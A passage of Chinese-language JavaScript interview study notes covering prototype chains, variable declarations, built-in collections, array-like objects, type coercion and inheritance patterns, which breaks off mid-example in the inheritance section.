**4、没有清理的DOM元素引用**

```js
var elements = {
    button: document.getElementById('button'),
    image: document.getElementById('image'),
    text: document.getElementById('text')
};
function doStuff() {
    image.src = 'http://some.url/image';
    button.click();
    console.log(text.innerHTML);
}
function removeButton(){
	document.body.removeChild(document.getElementById('button'));
}
```

虽用removeChild移除了button，但是还在elements对象里保存着button的引用，DOM元素还在内存里面

**5、未被销毁的事件监听**



---

## 13. 请问你了解js的原型链吗？

与其他面向对象语言不同，ES6之前js没有引入类（class）的概念，js并非通过类而是直接通过构造函数来创建实例

**原型**

`JavaScript` 常被描述为一种基于原型的语言——每个对象拥有一个原型对象

当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾

准确地说，这些属性和方法定义在Object的构造器函数（constructor functions）之上的`prototype`属性上，而非实例对象本身

下面举个例子：

函数可以有属性。 每个函数都有一个特殊的属性叫作原型`prototype`

```js
function doSomething(){}
console.log( doSomething.prototype );
```

控制台输出

```json
{
    constructor: ƒ doSomething(),
    __proto__: {
        constructor: ƒ Object(),
        hasOwnProperty: ƒ hasOwnProperty(),
        isPrototypeOf: ƒ isPrototypeOf(),
        propertyIsEnumerable: ƒ propertyIsEnumerable(),
        toLocaleString: ƒ toLocaleString(),
        toString: ƒ toString(),
        valueOf: ƒ valueOf()
    }
}
```

上面这个对象，就是大家常说的原型对象

可以看到，原型对象有一个自有属性`constructor`，这个属性指向该函数，如下图关系展示



**构造函数与实例原型**

在js中，每当定义一个函数(普通函数、类)时候，**都会天生自带一个prototype属性**，这个属性**指向函数的原型对象**，并且这个属性是一个对象数据类型的值

![img](E:\pogject\学习笔记\image\js\6792CAEEBFCDBCFC9E66B7976460013F)



原型对象可看作一个公共的区域，**所有同一个类的实例都可以访问到原型对象**，可将对象都有的内容，统一设置到原型对象中

`__proto__`

**每个对象**(除null外)都会有`__proto__`属性，这个属性会指向该对象的原型

注意：`__proto__ `是 ES 标准中 [[proto]] 指针，**不建议在代码中直接编写` proto `属性**，应该通过 **Object.getPrototypeOf(）**来获取原型

**`person.__proto__ === Person.prototype `![img](E:\pogject\学习笔记\image\js\CE5C7C6471A9A7C318E42BC23AE5A324)**



**constructor**

**每个原型都有一个constructor属性**，**指向该关联的构造函数**

![img](E:\pogject\学习笔记\image\js\C2935E207F25D2B293E277867849672F)

**原型链**

在JavaScript中万物都是对象，对象和对象之间也有关系，并不是孤立存在的。

原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为原型链 (prototype chain)，它解释了为何一个对象会拥有定义在其他对象中的属性和方法

对象之间的继承关系，**在JavaScript中是通过prototype对象指向父类对象，直到指向Object对象为止**，这样就形成了一个原型指向的链条，专业术语称之为**原型链**

注意：Object是js中所有**对象数据类型**的基类（最顶层的类），Object.prototype 没有原型，（`Object.prototype.__proto__ `的值为 null）

```js
console.log(Object.prototype);  // [Object: null prototype] {}
console.log(Object.prototype.__proto__);  // null

let a = 1;
console.log(a.__proto__);  // {}
```

像下图中：person → Person → Object ，普通人继承人类，人类继承对象类

当访问**对象的一个属性或方法时**，会先在对象自身中寻找，如果有则直接使用，**如果没有则会去原型对象中寻找**，如果找到则直接使用。如果没有则去原型的原型中寻找，**直到找到Object对象的原型**，Object对象的原型没有原型，如果在Object原型中依然没有找到，则返回undefined

![img](E:\pogject\学习笔记\image\js\847EB5079F1C884C1E9B01D4CDD52E60)



看一道经典面试题：

```js
var F=function(){}

Object.prototype.a=function(){
	console.log("a()");
}

Function.prototype.b=function(){
	console.log("b()")
}

var f=new F();

F.a();  //a()
F.b();  //b()

f.a();  //a()
f.b();  //TypeError: f.b is not a function
```

这道题有几个考点：1、原型与原型链 2、实例对象、构造函数、Object、Function的关系

代码分析：F是个构造函数，而f是构造函数F的一个实例

有：

```js
console.log(F instanceof Object);  //true
console.log(F instanceof Function);  //true
```

F是Object 和 Function两个的实例，即F既能访问到a，也能访问到b

故：F.a() 输出 a()   F.b()  输出  b()



对于f，并不是Function的实例，**因为它本来就不是构造函数**，只能访问Object原型链

有：

```js
console.log(f instanceof Object);  //true
console.log(f instanceof Function);  //false
```

故：f.a() 输出  a() f.b()报错

具体分析下，它们是如何在原型链上查找的：

**F.a() 查找路径：**

F自身：没有 → `F.__proto__`(Function.prototype)：没有 → `F.__proto__.__proto__`(Object.prototype)：输出 a()

```js
console.log(F.__proto__);  //{ b: [Function (anonymous)] }
console.log(F.__proto__.__proto__);  //[Object: null prototype] { a: [Function (anonymous)] }
```

**F.b() 查找路径：**

F自身：没有 → `F.__proto__`(Function.prototype)：b()

**f.a的查找路径：**

f自身：没有 → `f.__proto__`(Object.prototype)：输出a()

```js
console.log(Object.getPrototypeOf(f));  //{}
console.log(f.__proto__.__proto__);  //[Object: null prototype] { a: [Function (anonymous)] }
```

**f.b的查找路径：**

f自身：没有 → `f.__proto`__(Object.prototype)：没有 → f.`__proto__.__proto__ `(Object.prototype.`__proto__`)：找不到，所以报错

每个对象的`__proto__`都是指向它的构造函数的原型对象`prototype`的

```js
person1.__proto__ === Person.prototype
```

构造函数是一个函数对象，是通过 `Function `构造器产生的

```js
Person.__proto__ === Function.prototype
```

原型对象本身是一个普通对象，而普通对象的构造函数都是`Object`

```js
Person.prototype.__proto__ === Object.prototype
```

刚刚上面说了，所有的构造器都是函数对象，函数对象都是 `Function `构造产生的

```js
Object.__proto__ === Function.prototype
```

`Object `的原型对象也有`__proto__`属性指向`null`，`null`是原型链的顶端

```js
Object.prototype.__proto__ === null
```

总结：

- 一切对象都是继承自`Object`对象，`Object` 对象直接继承根源对象` null`
- 一切的函数对象（包括 `Object` 对象），都是继承自 `Function` 对象
- `Object` 对象直接继承自 `Function` 对象
- `Function`对象的`__proto__`会指向自己的原型对象，最终还是继承自`Object`对象



----

## 14. let const var 相关

var ——ES5 变量声明方式

1. 在变量未赋值时，变量undefined（为使用声明变量时也为undefined）
2. 作用域——var的作用域为**方法作用域**；只要在方法内定义了，整个方法内的定义变量后的代码都可以使用

let——ES6变量声明方式

1. 在变量未声明前直接使用会报错
2. 作用域——let为**块作用域**——通常let比var 范围要小
3. let禁止重复声明变量，否则会报错；**var可以重复声明**

const——ES6变量声明方式

1. const为常量声明方式；**声明变量时必须初始化**，在后面出现的代码中不能再修改该常量的值
2. const实际上保真的，并不是变量的值不得改动，**而是变量指向的那个内存地址不得改动**



------

## 15. Object.assign的理解

作用：Object.assign可以实现对象的合并。

语法：Object.assign(target, ...sources)

**解析**：

1. Object.assign会将source里面的**可枚举属性**复制到target，如果和target的已有属性重名，则会覆盖。
2. 后续的source会覆盖前面的source的同名属性。
3. Object.assign复制的是**属性值**，如果属性值是一个引用类型，**那么复制的其实是引用地址**，就会存在引用共享的问题。



------

## 16. constructor的理解

创建的每个函数都有一个prototype（原型）对象，这个属性是一个指针，指向一个对象。

在默认情况下，**所有原型对象都会自动获得一个constructor**（构造函数）属性，这**个属性是一个指向prototype属性所在函数的指针**。当调用构造函数创建一个新实例后，该实例的内部将包含一个指针（继承自构造函数的prototype），指向构造函数的原型对象。**注意当将构造函数的prototype设置为等于一个以对象字面量形式创建的新对象时，constructor属性不再指向该构造函数。**

**构造函数**属于被实例化的特定类[对象](https://developer.mozilla.org/zh-CN/docs/Glossary/Object) 。构造函数初始化这个对象，并提供可以访问其私有信息的方法。构造函数的概念可以应用于大多数[面向对象](https://developer.mozilla.org/zh-CN/docs/Glossary/OOP)的编程语言。本质上，[JavaScript](https://developer.mozilla.org/zh-CN/docs/Glossary/JavaScript) 中的构造函数通常在[类](https://developer.mozilla.org/zh-CN/docs/Glossary/Class)的实例中声明。



------

## 17. map 和 forEach 的区别

相同点：

1. 都是循环遍历数组中的每一项
2. 每次执行匿名函数都支持三个参数，参数分别为item（当前每一项），index（索引值），arr（原数组）
3. 匿名函数中的this都是指向window
4. 只能遍历数组

不同点：

1. map()**会分配内存空间存储新数组并返回**，forEach()不会返回数据。
2. forEach()**允许callback更改原始数组的元素**。map()返回新的数组。

------

## 18. for of 可以遍历哪些对象

for..of..: 它是es6新增的一个遍历方法，但**只限于迭代器(iterator)**, 所以普通的对象用for..of遍历
是会报错的。

可迭代的对象：包括Array, Map, Set, String, TypedArray, arguments对象等等

------

## 19. js静态类型检查

**js是动态类型语言**

静态类型语言 & 动态类型语言

- 静态类型语言：类型检查发生在编译阶段，因此除非修复错误，否则会一直编译失败
- 动态类型语言：只有在程序运行了一次的时候错误才会被发现，也就是在运行时，因此即使代码中包含了会 在运行时阻止脚本正常运行的错误类型，这段代码也可以通过编译

**js静态类型检查的方法**

**Flow**是Facebook开发和发布的一个开源的静态类型检查库，它允许你逐渐地向JavaScript代码中添加类型。

**TypeScript**是一个会编译为**JavaScript的超集**（尽管它看起来几乎像一种新的静态类型语言）

**使用静态类型的优势**

- 可以尽早发现bug和错误
- 减少了复杂的错误处理
- 将数据和行为分离
- 减少单元测试的数量
- 提供了领域建模（domain modeling）工具
- 帮助我们消除了一整类bug
- 重构时更有信心

**使用静态类型的劣势**

- 代码冗长
- 需要花时间去掌握类型



------

## 20. 关于indexof

语法：str.indexOf(searchValue [, fromIndex])

参数：searchValue：要被查找的字符串值。

如果没有提供确切地提供字符串，**[searchValue 会被强制设置为"undefined"**， 然后在当前字符串中查 找这个值。

举个例子：**'undefined'.indexOf()将会返回0**，因为undefined在位置0处被找到，但是'undefine'.indexOf()将会返回 -1 ，因为字符串'undefined'未被找到

fromIndex：可选

数字表示开始查找的位置。可以是任意整数，默认值为0。

如果fromIndex的值小于0，或者大于str.length，那么查找分别从0和str.length开始。（译者 注：**fromIndex的值小于0，等同于为空情况**；**fromIndex的值大于或等于str.length，那么结果 会直接返回-1**。）

举个例子，'hello world'.indexOf('o', -5)返回4，因为它是从位置0处开始查找，然后o在位置4处被找到。另一方面，'hello world'.indexOf('o', 11)（或fromIndex填入任何大于11的值） 将会返回-1，因为开始查找的位置11处，已经是这个字符串的结尾了。

返回值：

查找的字符串searchValue的**第一次**出现的索引，如果没有找到，则返回-1。

若被查找的字符串searchValue是一个空字符串，则返回fromIndex。如果fromIndex值为空，或者fromIndex值小于被查找的字符串的长度，返回值和以下的fromIndex值一样。

**如果fromIndex值大于等于字符串的长度，将会直接返回字符串的长度**（str.length）

特点：

1. 严格区分大小写
2. 在使用indexOf检索数组时，用‘===’去匹配，意味着会检查数据类型



------

## 21. webComponents

**Web Components** 总的来说是提供一整套完善的封装机制来把 Web 组件化这个东西标准化，每个框架实现 的组件都统一标准地进行输入输出，这样可以更好推动组件的复用

包含四个部分

1. Custom Elements

2. HTML Imports

3. HTML Templates

4. Shadow DOM

**Custom Elements**

提供一种方式让开发者可以自定义 HTML 元素，包括特定的组成，样式和行为。支持 Web Components 标准的浏览器会提供一系列 API 给开发者用于创建自定义的元素，或者扩展现有元素。

**HTML Imports**

一种在 HTMLs 中引用以及复用其他的 HTML 文档的方式。这个 Import 很漂亮，可以简单理解为我们常见 的模板中的include之类的作用

**HTML Templates**

模板

**Shadow DOM**

提供一种更好地组织页面元素的方式，来为日趋复杂的页面应用提供强大支持，避免代码间的相互影响

------

## 22. dva的数据流流向是怎么样的

数据的改变发生通常是通过用户交互行为或者浏览器行为（如路由跳转等）触发的，当此类行为会改变数据 的时候可以通过dispatch发起一个 action，如果是同步行为会直接通过Reducers改变State，如果是 异步行为（副作用）会先触发Effects然后流向Reducers最终改变State，所以在 dva 中，数据流向非 常清晰简明，并且思路基本跟开源社区保持一致。

![dva数据流动](E:\pogject\学习笔记\image\js\dva数据流动.png)



-----

## 23. HashMap 和 Array 有什么区别？

**ArrayMap**是一个<key,value>映射的数据结构，它设计上更多的是考虑内存的优化，**内部是使用两个数组进行数据存储**，一个数组记录key的hash值，另外一个数组记录Value值，它和SparseArray一样，**也会对key使用二分法进行从小到大排序**，在添加、删除、查找数据的时候都是**先使用二分查找法得到相应的index**，然后通过index来进行添加、查找、删除等操作，所以，应用场景和SparseArray的一样，如果在数据量比较大的情况下，那么它的性能将退化至少50%。

HashMap内部是使用一个默认容量为16的数组来存储数据的，而数组中每一个元素却又是一个链表的头结点，所以，更准确的来说，**HashMap内部存储结构是使用哈希表的拉链结构（数组+链表）**，这种存储数据的方法叫做**拉链法** 。

1. 查找效率
   HashMap因为其根据hashcode的值直接算出index,所以**其查找效率是随着数组长度增大而增加的**。
   ArrayMap使用的是二分法查找，**所以当数组长度每增加一倍时，就需要多进行一次判断**，效率下降
2. 扩容数量
   HashMap初始值16个长度，每次扩容的时候，直接申请双倍的数组空间。
   ArrayMap每次扩容的时候，如果size长度大于8时申请size*1.5个长度，大于4小于8时申请8个，小于4时申 请4个。这样比较ArrayMap其实是申请了更少的内存空间，但是扩容的频率会更高。因此，**如果数据量比较大的时候，还是使用HashMap更合适，因为其扩容的次数要比ArrayMap少很多。**
3. 扩容效率
   HashMap每次扩容的时候重新计算每个数组成员的位置，然后放到新的位置。
   ArrayMap则是直接使用System.arraycopy，所以**效率上肯定是ArrayMap更占优势**。
4. 内存消耗
   **以ArrayMap采用了一种独特的方式，能够重复的利用因为数据扩容而遗留下来的数组空间**，方便下一个ArrayMap的使用。而HashMap没有这种设计。 由于ArrayMap之缓存了长度是4和8的时候，所以如果频繁的使用到Map，而且数据量都比较小的时候，ArrayMap无疑是相当的是节省内存的。

总结
综上所述，数据量比较小，并且需要频繁的使用Map存储数据的时候，推荐使用ArrayMap。 而数据量比较大的 时候，则推荐使用HashMap。

------

## 24. HashMap和Object

Objects和Maps类似的是，它们都允许你按键存取一个值、删除键、检测一个键是否绑定了值。因此（并且也没有其他内建的替代方式了）过去我们一直都把对象当成Maps使用。不过Maps和Objects有一些重要的区别，在下列情况里使用Map会是更好的选择：

|          | Map                                                          | Object                                                       |
| :------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| 意外的键 | Map默认情况不包含任何键。只包含显式插入的键。                | 一个Object有一个原型, **原型链上的键名有可能和你自己在对象上的设置的键名产生冲突**。**注意:** 虽然 ES5 开始可以用Object.create(null)来创建一个没有原型的对象，但是这种用法不太常见。 |
| 键的类型 | 一个Map的键可以是**任意值**，包括函数、对象或任意基本类型。  | 一个Object的键必须是一个 [String](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/String) 或是[Symbol](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol)。 |
| 键的顺序 | Map中的 key 是有序的。因此，当迭代的时候，一个Map对象以插入的顺序返回键值。 | 一个Object的键是无序的注意：自ECMAScript 2015规范以来，对象*确实*保留了字符串和Symbol键的创建顺序； 因此，**在只有字符串键的对象上进行迭代将按插入顺序产生键。** |
| Size     | Map的键值对个数可以轻易地通过[size](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Map/size) 属性获取 | Object的键值对个数**只能手动计算**                           |
| 迭代     | Map是 [iterable](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/iterable) 的，所以可以直接被迭代。 | **迭代一个Object需要以某种方式获取它的键**然后才能迭代。     |
| 性能     | 在频繁增删键值对的场景下表现更好。                           | 在频繁添加和删除键值对的场景下未作出优化。                   |

------

## 25.  javascript中arguments相关的问题

**arguments**

在js中，我们在调用有参数的函数时，当往这个调用的有参函数传参时，js会把所传的参数全部存到一个叫arguments的对象里面。它是一个**类数组数据**

**由来**

Javascrip中每个函数都会有一个Arguments对象实例arguments，引用着函数的实参。**它是寄生在js函数当中的，不能显式创建，arguments对象只有函数开始时才可用**

**作用**

有了arguments这个对象之后，我们可以不用给函数预先设定形参了**，可以动态地通过arguments为函数加入参数**

`arguments`对象是所有（非箭头）函数中都可用的**局部变量**。你可以使用`arguments`对象在函数中引用函数的参数。**此对象包含传递给函数的每个参数，第一个参数在索引0处。**例如，如果一个函数传递了三个参数，你可以以如下方式引用他们：

```js
arguments[0]
arguments[1]
arguments[2]
```

**参数也可以被设置：**

```js
arguments[1] = 'new value';
```

`arguments`对象不是一个 [`Array`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array) 。它类似于`Array`，**但除了length属性和索引元素之外没有任何`Array`属性**。例如，它没有 [pop](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/pop) 方法。但是它可以被转换为一个真正的`Array`：

```js
var args = Array.prototype.slice.call(arguments);
var args = [].slice.call(arguments);

// ES2015
const args = Array.from(arguments);
const args = [...arguments];
```

如果调用的参数多于正式声明接受的参数，则可以使用`arguments`对象。这种技术对于可以传递可变数量的参数的函数很有用。使用 `arguments.length`来确定传递给函数参数的个数，然后使用`arguments`对象来处理每个参数。要确定函数[签名](https://developer.mozilla.org/zh-CN/docs/Glossary/Signature/Function)中（输入）参数的数量，请使用`Function.length`属性。

属性

- `arguments.callee`

  指向参数所属的当前执行的函数。

- `arguments.length`

  传递给函数的参数数量。

- `arguments[@@iterator]`

  返回一个新的`Array 迭代器` 对象，该对象包含参数中每个索引的值。

----

## 26.JS小数精度问题

了解 JavaScript 精度问题对我们业务有什么帮助呢？举个业务场景：比如有个订单号后端 Java 同学定义的是 long 类型，但是当这个订单号转换成 JavaScript 的 Number 类型时候精度会丢失了，那没有以上知识铺垫那就理解不了精度为什么会丢失。

解决方案大致有以下几种：

1.针对大数的整数可以考虑使用 bigint 类型(目前在 stage 3 阶段)；

2.使用 [bigNumber](https://link.segmentfault.com/?enc=JPLjlLOfJ9chWdUTAPgXgw%3D%3D.HymxswTVTz65vQslptk4XNygkv0vhjck8oI5CDc4zqTGn1MNyNupbGfAfd8tEQm4)，它的思想是转化成 string 进行处理，这种方式对性能有一定影响；

3.可以考虑使用 [long.js](https://link.segmentfault.com/?enc=Y3coKE7gF4OWDAhTvOx0hg%3D%3D.Y3RgnOf3cXhMtsXzLpi%2BPeK2gaWq2%2FR3xo3x8wWfaLy9v31lwe94LOTW2U%2BTbiSA)，它的思想是将 long 类型的值转化成两个 32 位的双精度类型的值。

4.针对小数可以考虑 [JavaScript 浮点数陷阱及解法](https://link.segmentfault.com/?enc=lolEqWD9vdttTpab8e4Ecw%3D%3D.r0O68zfrPVfwfYD7Gm0R9VAvAX8BuKYECS2%2BsloIw5LRHNhXn9ReisMV%2FXE4jPwk) 里面提到的方案；





------

## 27. setTimeout的替代方法



```js
function createOnFrame(duration, callback) {
  let count = 0;
  const _onFrame = function () {
    if (count < duration) {
      count += 16.66667;
      requestAnimationFrame(_onFrame);
      return;
    }

    callback();
  }
  return _onFrame;
}

const onFrame = createOnFrame(200, () => {
  // do something
  ....
});

const requestId = requestAnimationFrame(onFrame);
```





------

## 28. 编码和字符集的区别

字符集是书写系统字母与符号的集合，而字符编码则是将字符映射为一特定的字节或字节序列，是一种规则。通常特定的字符集采用特定的编码方式（即一种字符集对应一种字符编码（例如：ASCII、IOS-8859-1、GB2312、GBK，都是即表示了字符集又表示了对应的字符编码，但Unicode不是，它采用现代的模型））

**扩展：**

字符：在计算机和电信技术中，一个字符是一个单位的字形、类字形单位或符号的基本信息。即一个字符可以是一个中文汉字、一个英文字母、一个阿拉伯数字、一个标点符号等。

字符集：多个字符的集合。例如GB2312是中国国家标准的简体中文字符集，GB2312收录简化汉字（6763个）及一般符号、序号、数字、拉丁字母、日文假名、希腊字母、俄文字母、汉语拼音符号、汉语注音字母，共 7445 个图形字符。

字符编码：把字符集中的字符编码为（映射）指定集合中的某一对象（例如：比特模式、自然数序列、电脉冲），以便文本在计算机中存储和通过通信网络的传递。

一套编码系统定义字节与文本间的映射。一连串字节文本能让不同文本解释得以进行。我们指明一套特定编码系统时（如 UTF-8），也就指明了字节得以解释的方式。

例如，我们通常在 HTML 里声明 UTF-8 字符编码，使用如下：

```html
<meta charset="utf-8">
```

这就确保你在 HTML 文档中可以使用几乎任何一种人类语言中的字符，并且会稳定显示。



------

## 29. 数组和伪数组的区别

1. 定义

- 数组是一个特殊对象,与常规对象的区别：
  - 当由新元素添加到列表中时，自动更新length属性
  - 设置length属性，可以截断数组
  - 从Array.protoype中继承了方法
  - 属性为'Array'
- 类数组是一个拥有length属性，并且他属性为非负整数的普通对象，**类数组不能直接调用数组方法。**

1. 区别
   本质：**类数组是简单对象，它的原型关系与数组不同**。

```js
// 原型关系和原始值转换
let arrayLike = {
    length: 10,
};
console.log(arrayLike instanceof Array); // false
console.log(arrayLike.__proto__.constructor === Array); // false
console.log(arrayLike.toString()); // [object Object]
console.log(arrayLike.valueOf()); // {length: 10}

let array = [];
console.log(array instanceof Array); // true
console.log(array.__proto__.constructor === Array); // true
console.log(array.toString()); // ''
console.log(array.valueOf()); // []

```

1. 类数组转换为数组

- 转换方法
  - 使用Array.from()
  - 使用Array.prototype.slice.call()
  - 使用Array.prototype.forEach()进行属性遍历并组成新的数组
- 转换须知
  - 转换后的数组长度由length属性决定。索引不连续时转换结果是连续的，会自动补位。
  - 代码示例

```js
let al1 = {
    length: 4,
    0: 0,
    1: 1,
    3: 3,
    4: 4,
    5: 5,
};
console.log(Array.from(al1)) // [0, 1, undefined, 3]

```

- ②仅考虑 0或正整数 的索引

```js
// 代码示例
let al2 = {
    length: 4,
    '-1': -1,
    '0': 0,
    a: 'a',
    1: 1
};
console.log(Array.from(al2)); // [0, 1, undefined, undefined]

```

- ③使用slice转换产生稀疏数组

```js
// 代码示例
let al2 = {
    length: 4,
    '-1': -1,
    '0': 0,
    a: 'a',
    1: 1
};
console.log(Array.prototype.slice.call(al2)); // [ 0, 1, <2 empty items> ]

```

1. 使用数组方法操作类数组注意地方

```js
  let arrayLike2 = {
    2: 3,
    3: 4,
    length: 2,
    push: Array.prototype.push
  }

  // push 操作的是索引值为 length 的位置
  arrayLike2.push(1);
  console.log(arrayLike2); // {2: 1, 3: 4, length: 3, push: ƒ}
  arrayLike2.push(2);
  console.log(arrayLike2); // {2: 1, 3: 2, length: 4, push: ƒ}

```



------

## 30.介绍下 Set、Map、WeakSet 和 WeakMap 的区别？

**Set**

1. 成员不能重复；
2. 只有键值，没有键名，有点类似数组；
3. 可以遍历，方法有add、delete、has

**WeakSet**

1. **成员都是对象（引用）**；
2. 成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；
3. 不能遍历，方法有add、delete、has；

**Map**

1. 本质上是键值对的集合，类似集合；
2. 可以遍历，方法很多，可以跟各种数据格式转换；

**WeakMap**

1. **只接收对象为键名**（null 除外），不接受其他类型的值作为键名；
2. 键名指向的对象，不计入垃圾回收机制；
3. 不能遍历，方法同get、set、has、delete；



------

## 31 json和xml数据的区别

1. 数据体积方面：xml是重量级的，**json是轻量级的，传递的速度更快些**。
2. 数据传输方面：xml在传输过程中比较占带宽，**json占带宽少，易于压缩**。
3. 数据交互方面：**json与javascript的交互更加方便，更容易解析处理**，更好的进行数据交互
4. 数据描述方面：json对数据的**描述性比xml较差**
5. xml和json都用在项目交互下，**xml多用于做配置文件**，json用于数据交互。



------

## 32. 相等运算符隐藏的类型转换

相等运算符隐藏的类型转换，会带来一些违反直觉的结果

```js
'' == '0' // false
0 == '' // true
0 == '0' // true

false == 'false' // false
false == '0' // true

false == undefined // false
false == null // false

null == undefined // true
null == 0  // false
' \t\r\n' == 0 // true
```

Number,Boolean,String,Undefined这几种基本类型混合比较时，**会将其转换成数字再进行比较**


基本类型与复合对象进行比较时，会先将复合对象转换成基本类型（依次调用valueOf与toString方法）再进行比较 

undefined被当成基本类型，**undefined转换成数字是NaN**，因此undefined与除null之外的其它类型值进行比较时始终返回false(注意NaN==NaN返回false) 

null被当成复合对象，**由于null没有valueOf与toString方法**，因此和除了undefined之外的其它类型值进行比较时始终返回false 

- 存在 NaN 则返回 false



----

## 33. js对象如何转成数组的方法

**(1) Array.prototype.slice.call(obj)**

该方法可以将类数组对象转换为数组，所谓类数组对象，就是含 length 和索引属性的对象

返回的数组长度取决于对象 length 属性的值，且非索引属性的值，或索引大于 length 的值都不会被返回到数组中

```js
let obj = { '0': 3, '1': 13, '2': 23, '3': 33, 'length': 3, 'name': 330}
let arr = Array.prototype.slice.call(obj)  // [3, 13, 23]
```

**(2) Array.from(obj)**

该方法可以将类数组对象和可迭代对象转换为数组

类数组对象上文已提及，何为可迭代对象？

Array、Set、Map 和字符串都是可迭代对象（WeakMap/WeakSet 并不是可迭代对象）

字符串变成了可迭代对象，解决了编码的问题

这些对象都有默认的迭代器，即具有 Symbol.iterator 属性

可以用 for of 循环

所有通过生成器创建的迭代器都是可迭代对象

```js
document.getElementsByTagName("div") //返回的是可迭代对象但不是一个数组

Array.isArray(document.getElementsByTagName('div')） //返回 false
```



**(3) Object.values(obj), Object.keys(obj), Object.entries(obj)**  





---

# 高级部分

---



## 1. 请问js有哪些继承方式？

js常用继承方式主要有6种：原型链继承、构造函数继承、组合继承、原型式继承、寄生式继承、寄生组合式继承

创造一个超类型的构造函数Super()，为它设置静态属性name、原型链方法getSuper()

```js
function Super(){
    this.name =["super"];
}
Super.prototype.getSuper = function(){
    return this.name;
}
```

再创造一个子类构造函数Sub()，使用以上6种继承方法让Sub()继承Super()

```js
function Sub(){
    
}
```

---

### (1) 原型链继承

（将 子类的原型对象 指向 超类型的实例）**函数式继承**

```js
function Super(){
	this.name=["super"];
}
Super.prototype.getSuper=function(){
	return this.name;
}

function Sub(){

}

Sub.prototype=new Super();  //将Sub的原型对象Sub.prototype指向Super的实例

var sub1=new Sub();  //创建Sub的实例sub1
sub1.name.push("sub1");

console.log(sub1.getSuper());  // [ 'super', 'sub1' ]

var sub2=new Sub();  //创建Sub的实例sub2
sub2.name.push("sub2");

console.log(sub2.getSuper());  //[ 'super', 'sub1', 'sub2' ]
```

这样可以在Sub中继承 Super的属性name 以及 原型链方法getSuper，然而在sub1中修改name时，sub2的name也会受到影响

这种继承方式的**缺点**是：

（1）所有实例共享 超类中的属性

（2）子类的实例 不能向超类型构造函数传参

---

### (2) 构造函数继承

（子类中使用call调用超类）**函数式继承**

```js
function Super(name){
	this.name = name;
}
Super.prototype.getSuper = function(){
	return this.name;
}

function Sub(name){
	Super.call(this, name);  //在Sub中使用call去调用Super
}


var sub1=new Sub("sub1");  //创建Sub的实例sub1,

//console.log(sub1.getSuper());  //(不能继承原型链方法）TypeError: sub1.getSuper is not a function
console.log(sub1.name);  //  sub1

var sub2=new Sub();  //创建Sub的实例sub2

//console.log(sub2.getSuper());  //(不能继承原型链方法）TypeError: sub2.getSuper is not a function
console.log(sub2.name);  //undefined

var sup1=new Super();
console.log(sup1.getSuper());  //undefined
```

在Sub中用call调用Super，**继承了Super的所有静态属性**。在实例sub1、sub2中，各自对name的修改也互不影响，**实现了属性不共享，子类的实例也能向超类型构造函数传参**  

这种继承方式的**缺点**是：

（1）、不能继承原型链方法

---

### (3) 组合继承

（原型链继承+构造函数继承）函数式继承

```js
function Super(name){
	this.name=name;
}
Super.prototype.getSuper=function(){
	return this.name;
}

function Sub(name){
	Super.call(this, name);  //第二次调用，构造函数继承
}

Sub.prototype = new Super();  //第一次调用，原型链继承
Sub.prototype.constructor=Sub;

var sub1=new Sub("sub1");  //创建Sub的实例sub1,

console.log(sub1.getSuper());  //sub1
console.log(sub1.name);  //  sub1
console.log(sub1 instanceof Sub);  // true
console.log(sub1 instanceof Super);  // true

var sub2=new Sub("sub2");  //创建Sub的实例sub2

console.log(sub2.getSuper());  // sub2
console.log(sub2.name);  //sub2

```

在子类Sub中，使用 call继承超类型的属性 + 原型链继承原型链的方法和属性，弥补了上面两种继承方式的三个缺点

这种继承方式的**缺点**是：

（1）、调用了两次超类型的构造函数

第一次：Sub.prototype = new Super()，调用一次超类型构造函数

第二次：Sub内使用call方法，又调用了一次超类型构造函数，且之后每次实例化子类sub1、sub2...的过程中（ new Sub() ），都会调用超类型构造函数

---

### (4) 原型式继承

创造了一个 临时的构造函数F，将 F的原型 指向传进来的对象参数，再返回F的实例）

```js
function object(o){
	function F(){}
	F.prototype=o;
	return new F();
}

var person={
	name:"js",
	friends:["css","ts"]
}

var people1 = object(person);
// var people1 = Object.create(person);在传入一个参数的情况下，Object.create()和object()相同
people1.name="python";
people1.friends.push("pip");

console.log(people1.name);  //python
console.log(people1.friends);  //[ 'css', 'ts', 'pip' ]

var people2=object(person);
people2.name="java";
people2.friends.push("jar");

console.log(people2.friends);  //[ 'css', 'ts', 'pip', 'jar' ]

console.log(person.name);  //js
console.log(person.friends);  //[ 'css', 'ts', 'pip', 'jar' ]
```

原型式继承和原型链继承类似，区别：前者是完成了一次对 对象的浅拷贝，**后者是对构造函数进行继承**

**缺点**也是一致的：属性会被共享

---

### (5) 寄生式继承

（基于原型式继承的封装）

```js
function object(o){
	function F(){}
	F.prototype=o;
	return new F();
}

function createAnother(o){
	var clone=object(o);
	clone.sayHi=function(){
		console.log("hi");
	}
	return clone;
}

var person={
	name:"js",
	friends:["css","ts"]
}

var people1=createAnother(person);
// var people1 = Object.create(person);在传入一个参数的情况下，Object.create()和object()相同
people1.name="python";
people1.friends.push("pip");

console.log(people1.name);  //python
console.log(people1.friends);  //[ 'css', 'ts', 'pip' ]

var people2=createAnother(person);
people2.name="java";
people2.friends.push("jar");

console.log(people2.friends);  //[ 'css', 'ts', 'pip', 'jar' ]

people1.sayHi();  // hi
people2.sayHi();  // hi
```

此方法使用较少，本质上可以通过寄生式继承 **实现子类方法sayHi的复用**，后面通过createAnother()创造出来的对象，都拥有sayHi方法

---

### (6) 寄生组合式继承

在组合继承中，**若需要优化一次调用，那一定是第一次调用**：原型链继承，利用原型式继承便可实现

Sub.prototype = new Super()，实质上就是一次对超类型原型对象的拷贝

```js
function object(o){
	function F(){}
	F.prototype=o;
	return new F();
}

function inheritPrototype(subType, superType){
	//复制超类型的原型对象
	var clone=object(superType.prototype);
